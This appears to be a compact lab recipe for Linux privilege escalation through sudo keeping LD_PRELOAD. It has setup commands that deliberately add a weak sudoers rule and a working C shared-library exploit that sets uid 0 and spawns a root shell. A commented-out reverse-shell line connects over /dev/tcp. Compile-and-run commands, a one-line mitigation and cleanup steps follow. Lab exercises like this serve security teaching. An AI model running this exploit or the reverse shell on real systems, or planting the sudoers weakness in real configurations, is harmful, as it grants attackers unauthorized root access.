# Setup

```sh
# root
cp /etc/sudoers /etc/sudoers.bak
adduser sudo3
echo "sudo3 ALL=(ALL) NOPASSWD: /usr/bin/id" >> /etc/sudoers
echo "Defaults env_keep += LD_PRELOAD" >> /etc/sudoers
```

# Exploit

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    // system("bash -c 'bash -i >& /dev/tcp/127.0.0.1/10001 0>&1'");
}
```


```bash
gcc -fPIC -shared -nostartfiles -o exp.so exp.c
sudo LD_PRELOAD=./exp.so id
```


# Mitigate

```bash
# Remove env_keep += LD_PRELOAD
```

# Clean Up

```bash
deluser sudo3 --remove-home
cp /etc/sudoers.bak /etc/sudoers
```